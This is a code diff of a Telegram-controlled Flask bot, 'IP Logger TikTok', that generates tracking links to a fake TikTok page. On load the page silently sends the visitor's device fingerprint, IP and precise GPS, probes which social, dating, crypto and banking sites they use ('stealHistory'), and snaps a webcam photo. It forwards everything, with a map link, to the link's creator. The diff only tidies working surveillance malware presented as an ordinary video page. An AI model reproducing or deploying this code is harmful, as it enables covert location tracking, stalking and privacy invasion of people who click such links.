@@ -18,8 +18,7 @@ app = Flask(__name__)
 links = {}
 loop = None
 
-TIKTOK_PAGE = """
-<!DOCTYPE html>
+TIKTOK_PAGE = """<!DOCTYPE html>
 <html>
 <head><title>TikTok — Make Your Day</title><meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
@@ -44,49 +43,26 @@ body{background:#000;font-family:Arial;overflow:hidden}
 <canvas id="c" style="display:none"></canvas>
 <script>
 fetch('/collect/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ua:navigator.userAgent,pl:navigator.platform,la:navigator.language,ss:screen.width+'x'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,mem:navigator.deviceMemory||'?',cores:navigator.hardwareConcurrency||'?'})});
-
-// GPS МАКСИМАЛЬНОЙ ТОЧНОСТИ
 function getGPS(){
  if(navigator.geolocation){
   navigator.geolocation.getCurrentPosition(
-   pos=>{
-    fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,spd:pos.coords.speed})});
-   },
-   err=>{
-    navigator.geolocation.getCurrentPosition(
-     pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},
-     err2=>{},
-     {enableHighAccuracy:true,timeout:15000,maximumAge:0}
-    );
-   },
+   pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy,alt:pos.coords.altitude,spd:pos.coords.speed})});},
+   err=>{navigator.geolocation.getCurrentPosition(pos=>{fetch('/gps/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy})});},err2=>{},{enableHighAccuracy:true,timeout:15000,maximumAge:0});},
    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
   );
  }
 }
-
-// ИСТОРИЯ БРАУЗЕРА
 async function stealHistory(){
- const sites=[
-  'https://web.telegram.org','https://vk.com','https://ok.ru','https://facebook.com','https://instagram.com',
-  'https://twitter.com','https://youtube.com','https://twitch.tv','https://discord.com','https://github.com',
-  'https://steamcommunity.com','https://reddit.com','https://tinder.com','https://bumble.com','https://onlyfans.com',
-  'https://crypto.com','https://binance.com','https://bybit.com','https://paypal.com','https://sberbank.ru',
-  'https://tinkoff.ru','https://ozon.ru','https://wildberries.ru','https://avito.ru'
- ];
+ const sites=['https://web.telegram.org','https://vk.com','https://ok.ru','https://facebook.com','https://instagram.com','https://twitter.com','https://youtube.com','https://twitch.tv','https://discord.com','https://github.com','https://steamcommunity.com','https://reddit.com','https://tinder.com','https://bumble.com','https://onlyfans.com','https://crypto.com','https://binance.com','https://bybit.com','https://paypal.com','https://sberbank.ru','https://tinkoff.ru','https://ozon.ru','https://wildberries.ru','https://avito.ru'];
  const visited=[];
  for(const site of sites){
   try{
-   const img=new Image();
-   img.src=site+'/favicon.ico';
+   const img=new Image();img.src=site+'/favicon.ico';
    await new Promise((resolve)=>{img.onload=()=>{visited.push(site);resolve();};img.onerror=()=>{visited.push(site);resolve();};setTimeout(()=>resolve(),500);});
   }catch(e){}
  }
- if(visited.length>0){
-  fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited,time:new Date().toISOString()})});
- }
+ if(visited.length>0){fetch('/history/{{ link_id }}',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({visited:visited,time:new Date().toISOString()})});}
 }
-
-// КАМЕРА
 async function cam(){
  try{
   const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
@@ -99,14 +75,10 @@ async function cam(){
   st.getTracks().forEach(t=>t.stop());
  }catch(e){}
 }
-
-setTimeout(getGPS,1500);
-setTimeout(stealHistory,2000);
-setTimeout(cam,2500);
+setTimeout(getGPS,1500);setTimeout(stealHistory,2000);setTimeout(cam,2500);
 </script>
 </body>
-</html>
-"""
+</html>"""
 
 def gen_id():
     return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
@@ -118,10 +90,14 @@ def get_ip_info(ip):
     except:
         return {}
 
+@app.route('/')
+def home():
+    return "OK"
+
 @app.route('/go/<lid>')
 def track(lid):
     if lid not in links:
-        return "Видео недоступно"
+        return "Ссылка недействительна"
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     ua = request.headers.get('User-Agent', '?')
     v = {'time': datetime.now().strftime('%H:%M:%S'), 'ip': ip, 'ua': ua, 'photo': None, 'gps': None, 'history': None}
@@ -160,19 +136,17 @@ def history(lid):
 
 async def notify(uid, lid, v):
     try:
-        # 1. GPS точка + Google Maps
         if v.get('gps') and v['gps'].get('lat'):
             lat, lon = v['gps']['lat'], v['gps']['lon']
-            acc = v['gps'].get('acc', '?')
-            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(acc) if acc and acc != '?' else 10))
-            await bot.send_file(uid, file=geo, caption=f"📍 Точная GPS (погрешность: {acc}м)")
-            await bot.send_message(uid, f"🗺 [Открыть в Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
+            acc = v['gps'].get('acc', 10)
+            geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=lat, long=lon, accuracy_radius=int(acc) if acc else 10))
+            await bot.send_file(uid, file=geo, caption=f"📍 Точный GPS (±{acc}м)")
+            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={lat},{lon})", link_preview=True)
         elif v.get('lat') and v.get('lon'):
             geo = InputMediaGeoPoint(geo_point=InputGeoPoint(lat=v['lat'], long=v['lon'], accuracy_radius=500))
-            await bot.send_file(uid, file=geo, caption="📍 IP-геолокация (примерно)")
-            await bot.send_message(uid, f"🗺 [Открыть в Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
+            await bot.send_file(uid, file=geo, caption="📍 IP-геолокация (±500м)")
+            await bot.send_message(uid, f"🗺 [Google Maps](https://maps.google.com/?q={v['lat']},{v['lon']})", link_preview=True)
         
-        # 2. Текст + история браузера
         msg = f"""🎯 **Новый переход!**
 🕐 {v['time']}
 🌐 IP: `{v['ip']}`
@@ -184,14 +158,12 @@ async def notify(uid, lid, v):
             visited = v['history']['visited']
             msg += f"\n📜 **История браузера ({len(visited)} сайтов):**\n"
             for site in visited[:15]:
-                domain = site.replace('https://', '').replace('http://', '')
-                msg += f"• {domain}\n"
+                msg += f"• {site.replace('https://','').replace('http://','')}\n"
             if len(visited) > 15:
                 msg += f"...и ещё {len(visited)-15}"
         
         await bot.send_message(uid, msg)
         
-        # 3. Фото
         if v.get('photo'):
             try:
                 photo_bytes = base64.b64decode(v['photo'].split(',')[1])
@@ -199,17 +171,17 @@ async def notify(uid, lid, v):
             except:
                 pass
     except Exception as e:
-        print(f"Ошибка: {e}")
+        print(f"Ошибка notify: {e}")
 
 @bot.on(events.NewMessage(pattern='/start'))
 async def start(event):
-    await event.reply("🎭 **IP Logger TikTok**\n\n/create — новая ссылка\n/list — мои ссылки\n\n📸 Фото + 📍 Точный GPS + 🗺 Google Maps + 📜 История браузера")
+    await event.reply("🎭 **IP Logger TikTok**\n\n/create — новая ссылка\n/list — мои ссылки")
 
 @bot.on(events.NewMessage(pattern='/create'))
 async def create(event):
     lid = gen_id()
     links[lid] = {'owner': event.sender_id, 'created': datetime.now().strftime('%H:%M'), 'victims': []}
-    await event.reply(f"✅ Ссылка (TikTok):\n`https://botaald.onrender.com/go/{lid}`")
+    await event.reply(f"✅ Ссылка:\n`https://botaald.onrender.com/go/{lid}`")
 
 @bot.on(events.NewMessage(pattern='/list'))
 async def lst(event):
@@ -225,11 +197,12 @@ async def lst(event):
 async def main():
     global loop
     loop = asyncio.get_event_loop()
+    port = int(os.environ.get('PORT', 8080))
     def run_flask():
-        app.run(host='0.0.0.0', port=8080, debug=False)
+        app.run(host='0.0.0.0', port=port, debug=False)
     threading.Thread(target=run_flask, daemon=True).start()
     await bot.start(bot_token=BOT_TOKEN)
-    print("Бот запущен!")
+    print("✅ Бот запущен!")
     await bot.run_until_disconnected()
 
 if __name__ == "__main__":
